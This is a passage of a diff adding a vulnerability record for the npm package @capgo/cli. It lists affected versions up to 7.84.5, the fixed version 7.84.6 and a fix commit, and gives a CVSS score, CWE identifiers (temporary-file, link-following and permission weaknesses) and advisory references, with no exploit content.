+      - pkg:npm/%40capgo/cli@4.16.0
+      - pkg:npm/%40capgo/cli@4.16.1
+      - pkg:npm/%40capgo/cli@4.16.2
+      - pkg:npm/%40capgo/cli@4.16.3
+      - pkg:npm/%40capgo/cli@4.16.4
+      - pkg:npm/%40capgo/cli@4.16.5
+      - pkg:npm/%40capgo/cli@4.16.6
+      - pkg:npm/%40capgo/cli@4.17.0
+      - pkg:npm/%40capgo/cli@4.18.0
+      - pkg:npm/%40capgo/cli@4.18.1
+      - pkg:npm/%40capgo/cli@4.18.2
+      - pkg:npm/%40capgo/cli@4.20.2
+      - pkg:npm/%40capgo/cli@4.20.3
+      - pkg:npm/%40capgo/cli@4.20.4
+      - pkg:npm/%40capgo/cli@4.20.5
+      - pkg:npm/%40capgo/cli@4.20.6
+      - pkg:npm/%40capgo/cli@4.20.7
+      - pkg:npm/%40capgo/cli@4.20.8
+      - pkg:npm/%40capgo/cli@4.21.2
+      - pkg:npm/%40capgo/cli@4.21.3
+      - pkg:npm/%40capgo/cli@4.21.4
+      - pkg:npm/%40capgo/cli@4.21.5
+      - pkg:npm/%40capgo/cli@4.21.6
+      - pkg:npm/%40capgo/cli@4.21.7
+      - pkg:npm/%40capgo/cli@4.21.8
+      - pkg:npm/%40capgo/cli@4.21.9
+      - pkg:npm/%40capgo/cli@4.21.10
+      - pkg:npm/%40capgo/cli@4.21.11
+      - pkg:npm/%40capgo/cli@4.21.12
+      - pkg:npm/%40capgo/cli@4.21.13
+      - pkg:npm/%40capgo/cli@4.21.14
+      - pkg:npm/%40capgo/cli@4.21.15
+      - pkg:npm/%40capgo/cli@4.21.16
+      - pkg:npm/%40capgo/cli@4.21.29
+      - pkg:npm/%40capgo/cli@4.21.30
+      - pkg:npm/%40capgo/cli@4.21.33
+      - pkg:npm/%40capgo/cli@4.21.34
+      - pkg:npm/%40capgo/cli@4.21.35
+      - pkg:npm/%40capgo/cli@4.21.36
+      - pkg:npm/%40capgo/cli@4.22.0
+      - pkg:npm/%40capgo/cli@4.22.1
+      - pkg:npm/%40capgo/cli@4.22.2
+      - pkg:npm/%40capgo/cli@4.22.3
+      - pkg:npm/%40capgo/cli@4.22.4
+      - pkg:npm/%40capgo/cli@4.22.5
+      - pkg:npm/%40capgo/cli@4.22.6
+      - pkg:npm/%40capgo/cli@4.22.7
+      - pkg:npm/%40capgo/cli@4.22.8
+      - pkg:npm/%40capgo/cli@4.22.11
+      - pkg:npm/%40capgo/cli@4.23.0
+      - pkg:npm/%40capgo/cli@4.23.1
+      - pkg:npm/%40capgo/cli@4.23.2
+      - pkg:npm/%40capgo/cli@4.24.0
+      - pkg:npm/%40capgo/cli@4.24.1
+      - pkg:npm/%40capgo/cli@4.24.2
+      - pkg:npm/%40capgo/cli@4.25.0
+      - pkg:npm/%40capgo/cli@4.25.1
+      - pkg:npm/%40capgo/cli@4.25.4
+      - pkg:npm/%40capgo/cli@4.25.5
+      - pkg:npm/%40capgo/cli@4.25.6
+      - pkg:npm/%40capgo/cli@4.26.0
+      - pkg:npm/%40capgo/cli@4.26.2
+      - pkg:npm/%40capgo/cli@4.26.3
+      - pkg:npm/%40capgo/cli@4.26.4
+      - pkg:npm/%40capgo/cli@4.26.5
+      - pkg:npm/%40capgo/cli@4.26.6
+      - pkg:npm/%40capgo/cli@4.26.8
+      - pkg:npm/%40capgo/cli@4.26.9
+      - pkg:npm/%40capgo/cli@4.26.10
+      - pkg:npm/%40capgo/cli@4.26.11
+      - pkg:npm/%40capgo/cli@4.26.12
+      - pkg:npm/%40capgo/cli@4.26.13
+      - pkg:npm/%40capgo/cli@4.26.14
+      - pkg:npm/%40capgo/cli@4.27.5
+      - pkg:npm/%40capgo/cli@4.27.6
+      - pkg:npm/%40capgo/cli@4.27.7
+      - pkg:npm/%40capgo/cli@4.27.8
+      - pkg:npm/%40capgo/cli@4.27.9
+      - pkg:npm/%40capgo/cli@4.28.0
+      - pkg:npm/%40capgo/cli@4.28.1
+      - pkg:npm/%40capgo/cli@4.28.2
+      - pkg:npm/%40capgo/cli@4.29.0
+      - pkg:npm/%40capgo/cli@4.29.1
+      - pkg:npm/%40capgo/cli@4.30.0
+      - pkg:npm/%40capgo/cli@4.30.1
+      - pkg:npm/%40capgo/cli@4.30.2
+      - pkg:npm/%40capgo/cli@4.30.3
+      - pkg:npm/%40capgo/cli@4.30.4
+      - pkg:npm/%40capgo/cli@4.30.5
+      - pkg:npm/%40capgo/cli@4.30.6
+      - pkg:npm/%40capgo/cli@4.30.8
+      - pkg:npm/%40capgo/cli@4.30.9
+      - pkg:npm/%40capgo/cli@4.32.4
+      - pkg:npm/%40capgo/cli@4.33.0
+      - pkg:npm/%40capgo/cli@4.34.0
+      - pkg:npm/%40capgo/cli@4.34.5
+      - pkg:npm/%40capgo/cli@4.34.6
+      - pkg:npm/%40capgo/cli@5.0.0-alpha.3
+      - pkg:npm/%40capgo/cli@5.0.0-alpha.7
+      - pkg:npm/%40capgo/cli@5.0.0
+      - pkg:npm/%40capgo/cli@7.0.1
+      - pkg:npm/%40capgo/cli@7.0.2
+      - pkg:npm/%40capgo/cli@7.0.4
+      - pkg:npm/%40capgo/cli@7.0.5
+      - pkg:npm/%40capgo/cli@7.0.6
+      - pkg:npm/%40capgo/cli@7.0.8
+      - pkg:npm/%40capgo/cli@7.0.9
+      - pkg:npm/%40capgo/cli@7.0.10
+      - pkg:npm/%40capgo/cli@7.0.11
+      - pkg:npm/%40capgo/cli@7.0.12
+      - pkg:npm/%40capgo/cli@7.0.13
+      - pkg:npm/%40capgo/cli@7.0.14
+      - pkg:npm/%40capgo/cli@7.0.15
+      - pkg:npm/%40capgo/cli@7.0.16
+      - pkg:npm/%40capgo/cli@7.0.17-beta.1
+      - pkg:npm/%40capgo/cli@7.0.17-beta.2
+      - pkg:npm/%40capgo/cli@7.0.17-beta.3
+      - pkg:npm/%40capgo/cli@7.0.17-beta.4
+      - pkg:npm/%40capgo/cli@7.0.17-beta.5
+      - pkg:npm/%40capgo/cli@7.0.17-beta.6
+      - pkg:npm/%40capgo/cli@7.0.17-beta.7
+      - pkg:npm/%40capgo/cli@7.0.17
+      - pkg:npm/%40capgo/cli@7.1.0
+      - pkg:npm/%40capgo/cli@7.1.1
+      - pkg:npm/%40capgo/cli@7.1.2
+      - pkg:npm/%40capgo/cli@7.1.3
+      - pkg:npm/%40capgo/cli@7.1.5
+      - pkg:npm/%40capgo/cli@7.1.9
+      - pkg:npm/%40capgo/cli@7.1.14
+      - pkg:npm/%40capgo/cli@7.1.15
+      - pkg:npm/%40capgo/cli@7.1.16
+      - pkg:npm/%40capgo/cli@7.1.17
+      - pkg:npm/%40capgo/cli@7.1.18
+      - pkg:npm/%40capgo/cli@7.1.19
+      - pkg:npm/%40capgo/cli@7.1.20
+      - pkg:npm/%40capgo/cli@7.2.0
+      - pkg:npm/%40capgo/cli@7.2.1
+      - pkg:npm/%40capgo/cli@7.2.2
+      - pkg:npm/%40capgo/cli@7.2.3
+      - pkg:npm/%40capgo/cli@7.2.4
+      - pkg:npm/%40capgo/cli@7.2.5
+      - pkg:npm/%40capgo/cli@7.2.6
+      - pkg:npm/%40capgo/cli@7.2.7
+      - pkg:npm/%40capgo/cli@7.2.8
+      - pkg:npm/%40capgo/cli@7.2.9
+      - pkg:npm/%40capgo/cli@7.2.10
+      - pkg:npm/%40capgo/cli@7.3.2
+      - pkg:npm/%40capgo/cli@7.3.3
+      - pkg:npm/%40capgo/cli@7.4.0
+      - pkg:npm/%40capgo/cli@7.4.3
+      - pkg:npm/%40capgo/cli@7.4.6
+      - pkg:npm/%40capgo/cli@7.4.7
+      - pkg:npm/%40capgo/cli@7.4.8
+      - pkg:npm/%40capgo/cli@7.4.9
+      - pkg:npm/%40capgo/cli@7.4.10
+      - pkg:npm/%40capgo/cli@7.4.11
+      - pkg:npm/%40capgo/cli@7.4.12
+      - pkg:npm/%40capgo/cli@7.4.13
+      - pkg:npm/%40capgo/cli@7.4.14
+      - pkg:npm/%40capgo/cli@7.4.15
+      - pkg:npm/%40capgo/cli@7.4.16
+      - pkg:npm/%40capgo/cli@7.4.17
+      - pkg:npm/%40capgo/cli@7.4.18
+      - pkg:npm/%40capgo/cli@7.5.0
+      - pkg:npm/%40capgo/cli@7.5.1
+      - pkg:npm/%40capgo/cli@7.5.2
+      - pkg:npm/%40capgo/cli@7.5.3
+      - pkg:npm/%40capgo/cli@7.5.4
+      - pkg:npm/%40capgo/cli@7.5.5
+      - pkg:npm/%40capgo/cli@7.6.1
+      - pkg:npm/%40capgo/cli@7.6.2
+      - pkg:npm/%40capgo/cli@7.6.3
+      - pkg:npm/%40capgo/cli@7.6.4
+      - pkg:npm/%40capgo/cli@7.7.0
+      - pkg:npm/%40capgo/cli@7.7.1
+      - pkg:npm/%40capgo/cli@7.7.2
+      - pkg:npm/%40capgo/cli@7.9.2
+      - pkg:npm/%40capgo/cli@7.9.7
+      - pkg:npm/%40capgo/cli@7.10.0
+      - pkg:npm/%40capgo/cli@7.10.1
+      - pkg:npm/%40capgo/cli@7.10.2
+      - pkg:npm/%40capgo/cli@7.10.4
+      - pkg:npm/%40capgo/cli@7.10.5
+      - pkg:npm/%40capgo/cli@7.11.3
+      - pkg:npm/%40capgo/cli@7.11.4
+      - pkg:npm/%40capgo/cli@7.11.5
+      - pkg:npm/%40capgo/cli@7.11.6
+      - pkg:npm/%40capgo/cli@7.11.7
+      - pkg:npm/%40capgo/cli@7.11.8
+      - pkg:npm/%40capgo/cli@7.11.9
+      - pkg:npm/%40capgo/cli@7.11.10
+      - pkg:npm/%40capgo/cli@7.11.11
+      - pkg:npm/%40capgo/cli@7.11.12
+      - pkg:npm/%40capgo/cli@7.11.13
+      - pkg:npm/%40capgo/cli@7.11.14
+      - pkg:npm/%40capgo/cli@7.11.15
+      - pkg:npm/%40capgo/cli@7.11.16
+      - pkg:npm/%40capgo/cli@7.11.17
+      - pkg:npm/%40capgo/cli@7.11.18
+      - pkg:npm/%40capgo/cli@7.11.19
+      - pkg:npm/%40capgo/cli@7.12.0
+      - pkg:npm/%40capgo/cli@7.12.1
+      - pkg:npm/%40capgo/cli@7.13.0
+      - pkg:npm/%40capgo/cli@7.13.1
+      - pkg:npm/%40capgo/cli@7.14.0
+      - pkg:npm/%40capgo/cli@7.14.1
+      - pkg:npm/%40capgo/cli@7.14.2
+      - pkg:npm/%40capgo/cli@7.14.3
+      - pkg:npm/%40capgo/cli@7.14.4
+      - pkg:npm/%40capgo/cli@7.14.5
+      - pkg:npm/%40capgo/cli@7.15.0
+      - pkg:npm/%40capgo/cli@7.15.1
+      - pkg:npm/%40capgo/cli@7.15.2
+      - pkg:npm/%40capgo/cli@7.15.3
+      - pkg:npm/%40capgo/cli@7.17.0
+      - pkg:npm/%40capgo/cli@7.17.1
+      - pkg:npm/%40capgo/cli@7.17.5
+      - pkg:npm/%40capgo/cli@7.17.6
+      - pkg:npm/%40capgo/cli@7.17.7
+      - pkg:npm/%40capgo/cli@7.17.8
+      - pkg:npm/%40capgo/cli@7.17.9
+      - pkg:npm/%40capgo/cli@7.17.10
+      - pkg:npm/%40capgo/cli@7.18.1
+      - pkg:npm/%40capgo/cli@7.18.2
+      - pkg:npm/%40capgo/cli@7.18.3
+      - pkg:npm/%40capgo/cli@7.18.5
+      - pkg:npm/%40capgo/cli@7.18.6
+      - pkg:npm/%40capgo/cli@7.18.7
+      - pkg:npm/%40capgo/cli@7.18.8
+      - pkg:npm/%40capgo/cli@7.18.9
+      - pkg:npm/%40capgo/cli@7.18.10
+      - pkg:npm/%40capgo/cli@7.18.11
+      - pkg:npm/%40capgo/cli@7.18.12
+      - pkg:npm/%40capgo/cli@7.18.13
+      - pkg:npm/%40capgo/cli@7.18.14
+      - pkg:npm/%40capgo/cli@7.18.15
+      - pkg:npm/%40capgo/cli@7.18.16
+      - pkg:npm/%40capgo/cli@7.18.17
+      - pkg:npm/%40capgo/cli@7.18.18
+      - pkg:npm/%40capgo/cli@7.18.19
+      - pkg:npm/%40capgo/cli@7.18.20
+      - pkg:npm/%40capgo/cli@7.18.21
+      - pkg:npm/%40capgo/cli@7.18.22
+      - pkg:npm/%40capgo/cli@7.18.23
+      - pkg:npm/%40capgo/cli@7.19.0
+      - pkg:npm/%40capgo/cli@7.19.1
+      - pkg:npm/%40capgo/cli@7.19.2
+      - pkg:npm/%40capgo/cli@7.19.3
+      - pkg:npm/%40capgo/cli@7.19.4
+      - pkg:npm/%40capgo/cli@7.20.0
+      - pkg:npm/%40capgo/cli@7.20.1
+      - pkg:npm/%40capgo/cli@7.20.2
+      - pkg:npm/%40capgo/cli@7.20.3
+      - pkg:npm/%40capgo/cli@7.21.0
+      - pkg:npm/%40capgo/cli@7.21.1
+      - pkg:npm/%40capgo/cli@7.21.2
+      - pkg:npm/%40capgo/cli@7.21.3
+      - pkg:npm/%40capgo/cli@7.21.4
+      - pkg:npm/%40capgo/cli@7.21.5
+      - pkg:npm/%40capgo/cli@7.22.0
+      - pkg:npm/%40capgo/cli@7.23.0
+      - pkg:npm/%40capgo/cli@7.24.0
+      - pkg:npm/%40capgo/cli@7.25.0
+      - pkg:npm/%40capgo/cli@7.25.1
+      - pkg:npm/%40capgo/cli@7.26.0
+      - pkg:npm/%40capgo/cli@7.26.1
+      - pkg:npm/%40capgo/cli@7.26.2
+      - pkg:npm/%40capgo/cli@7.27.0
+      - pkg:npm/%40capgo/cli@7.27.1
+      - pkg:npm/%40capgo/cli@7.28.0
+      - pkg:npm/%40capgo/cli@7.28.1
+      - pkg:npm/%40capgo/cli@7.29.0
+      - pkg:npm/%40capgo/cli@7.29.1
+      - pkg:npm/%40capgo/cli@7.29.2
+      - pkg:npm/%40capgo/cli@7.30.0
+      - pkg:npm/%40capgo/cli@7.31.0
+      - pkg:npm/%40capgo/cli@7.31.1
+      - pkg:npm/%40capgo/cli@7.33.0
+      - pkg:npm/%40capgo/cli@7.33.1
+      - pkg:npm/%40capgo/cli@7.34.0
+      - pkg:npm/%40capgo/cli@7.35.0
+      - pkg:npm/%40capgo/cli@7.36.0
+      - pkg:npm/%40capgo/cli@7.37.0
+      - pkg:npm/%40capgo/cli@7.37.1
+      - pkg:npm/%40capgo/cli@7.37.2
+      - pkg:npm/%40capgo/cli@7.37.3
+      - pkg:npm/%40capgo/cli@7.37.4
+      - pkg:npm/%40capgo/cli@7.38.0
+      - pkg:npm/%40capgo/cli@7.39.0
+      - pkg:npm/%40capgo/cli@7.39.1
+      - pkg:npm/%40capgo/cli@7.40.0
+      - pkg:npm/%40capgo/cli@7.41.0
+      - pkg:npm/%40capgo/cli@7.41.1
+      - pkg:npm/%40capgo/cli@7.41.2
+      - pkg:npm/%40capgo/cli@7.41.3
+      - pkg:npm/%40capgo/cli@7.42.0
+      - pkg:npm/%40capgo/cli@7.42.1
+      - pkg:npm/%40capgo/cli@7.43.0
+      - pkg:npm/%40capgo/cli@7.44.0
+      - pkg:npm/%40capgo/cli@7.44.1
+      - pkg:npm/%40capgo/cli@7.44.2
+      - pkg:npm/%40capgo/cli@7.45.0
+      - pkg:npm/%40capgo/cli@7.46.0
+      - pkg:npm/%40capgo/cli@7.47.0
+      - pkg:npm/%40capgo/cli@7.48.0
+      - pkg:npm/%40capgo/cli@7.49.0
+      - pkg:npm/%40capgo/cli@7.50.0
+      - pkg:npm/%40capgo/cli@7.51.0
+      - pkg:npm/%40capgo/cli@7.52.0
+      - pkg:npm/%40capgo/cli@7.53.0
+      - pkg:npm/%40capgo/cli@7.54.0
+      - pkg:npm/%40capgo/cli@7.55.0
+      - pkg:npm/%40capgo/cli@7.56.0
+      - pkg:npm/%40capgo/cli@7.56.1
+      - pkg:npm/%40capgo/cli@7.56.2
+      - pkg:npm/%40capgo/cli@7.56.3
+      - pkg:npm/%40capgo/cli@7.56.4
+      - pkg:npm/%40capgo/cli@7.57.0
+      - pkg:npm/%40capgo/cli@7.58.0
+      - pkg:npm/%40capgo/cli@7.58.1
+      - pkg:npm/%40capgo/cli@7.58.2
+      - pkg:npm/%40capgo/cli@7.59.0
+      - pkg:npm/%40capgo/cli@7.60.0
+      - pkg:npm/%40capgo/cli@7.61.0
+      - pkg:npm/%40capgo/cli@7.62.0
+      - pkg:npm/%40capgo/cli@7.62.1
+      - pkg:npm/%40capgo/cli@7.62.2
+      - pkg:npm/%40capgo/cli@7.63.0
+      - pkg:npm/%40capgo/cli@7.64.0
+      - pkg:npm/%40capgo/cli@7.64.1
+      - pkg:npm/%40capgo/cli@7.65.0
+      - pkg:npm/%40capgo/cli@7.66.0
+      - pkg:npm/%40capgo/cli@7.66.1
+      - pkg:npm/%40capgo/cli@7.66.2
+      - pkg:npm/%40capgo/cli@7.66.3
+      - pkg:npm/%40capgo/cli@7.66.4
+      - pkg:npm/%40capgo/cli@7.67.0
+      - pkg:npm/%40capgo/cli@7.68.0
+      - pkg:npm/%40capgo/cli@7.68.1
+      - pkg:npm/%40capgo/cli@7.68.2
+      - pkg:npm/%40capgo/cli@7.69.0
+      - pkg:npm/%40capgo/cli@7.70.0
+      - pkg:npm/%40capgo/cli@7.71.0
+      - pkg:npm/%40capgo/cli@7.71.1
+      - pkg:npm/%40capgo/cli@7.71.2
+      - pkg:npm/%40capgo/cli@7.71.3
+      - pkg:npm/%40capgo/cli@7.71.4
+      - pkg:npm/%40capgo/cli@7.71.5
+      - pkg:npm/%40capgo/cli@7.71.6
+      - pkg:npm/%40capgo/cli@7.71.7
+      - pkg:npm/%40capgo/cli@7.71.8
+      - pkg:npm/%40capgo/cli@7.71.9
+      - pkg:npm/%40capgo/cli@7.71.10
+      - pkg:npm/%40capgo/cli@7.71.11
+      - pkg:npm/%40capgo/cli@7.71.12
+      - pkg:npm/%40capgo/cli@7.72.0
+      - pkg:npm/%40capgo/cli@7.72.1
+      - pkg:npm/%40capgo/cli@7.72.2
+      - pkg:npm/%40capgo/cli@7.72.3
+      - pkg:npm/%40capgo/cli@7.72.4
+      - pkg:npm/%40capgo/cli@7.72.5
+      - pkg:npm/%40capgo/cli@7.73.0
+      - pkg:npm/%40capgo/cli@7.73.1
+      - pkg:npm/%40capgo/cli@7.73.2
+      - pkg:npm/%40capgo/cli@7.74.0
+      - pkg:npm/%40capgo/cli@7.74.1
+      - pkg:npm/%40capgo/cli@7.74.2
+      - pkg:npm/%40capgo/cli@7.74.3
+      - pkg:npm/%40capgo/cli@7.74.4
+      - pkg:npm/%40capgo/cli@7.75.0
+      - pkg:npm/%40capgo/cli@7.75.1
+      - pkg:npm/%40capgo/cli@7.76.0
+      - pkg:npm/%40capgo/cli@7.76.1
+      - pkg:npm/%40capgo/cli@7.76.2
+      - pkg:npm/%40capgo/cli@7.76.3
+      - pkg:npm/%40capgo/cli@7.76.4
+      - pkg:npm/%40capgo/cli@7.76.5
+      - pkg:npm/%40capgo/cli@7.76.6
+      - pkg:npm/%40capgo/cli@7.76.7
+      - pkg:npm/%40capgo/cli@7.76.8
+      - pkg:npm/%40capgo/cli@7.77.0
+      - pkg:npm/%40capgo/cli@7.78.0
+      - pkg:npm/%40capgo/cli@7.79.0
+      - pkg:npm/%40capgo/cli@7.80.0
+      - pkg:npm/%40capgo/cli@7.81.0
+      - pkg:npm/%40capgo/cli@7.81.1
+      - pkg:npm/%40capgo/cli@7.81.2
+      - pkg:npm/%40capgo/cli@7.82.0
+      - pkg:npm/%40capgo/cli@7.83.0
+      - pkg:npm/%40capgo/cli@7.83.1
+      - pkg:npm/%40capgo/cli@7.84.0
+      - pkg:npm/%40capgo/cli@7.84.1
+      - pkg:npm/%40capgo/cli@7.84.2
+      - pkg:npm/%40capgo/cli@7.84.3
+      - pkg:npm/%40capgo/cli@7.84.4
+      - pkg:npm/%40capgo/cli@7.84.5
+    fixed_packages:
+      - pkg:npm/%40capgo/cli@7.84.6
+    fixed_in_commits: []
+    introduced_in_commits: []
+  - purl: pkg:github/cap-go/cli
+    affected_versions:
+    fixed_versions:
+    affected_packages: []
+    fixed_packages: []
+    fixed_in_commits:
+      - vcs_url: https://github.com/cap-go/cli
+        commit: b8aa5ccbfad2d7f10f3cdbc00910d4a6aab026b2
+        patch_text:
+    introduced_in_commits: []
+severities:
+  - score: '8.6'
+    scoring_system: cvssv4
+    scoring_elements: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/03/GHSA-8mpm-q7mh-8fvh/GHSA-8mpm-q7mh-8fvh.json
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-377
+  - CWE-59
+  - CWE-276
+references:
+  - url: https://github.com/Cap-go/capgo
+    reference_type:
+    reference_id:
+  - url: https://github.com/Cap-go/CLI/commit/b8aa5ccbfad2d7f10f3cdbc00910d4a6aab026b2
+    reference_type:
+    reference_id:
+  - url: https://github.com/Cap-go/capgo/security/advisories/GHSA-8mpm-q7mh-8fvh
+    reference_type:
+    reference_id: GHSA-8mpm-q7mh-8fvh
+exploits: []
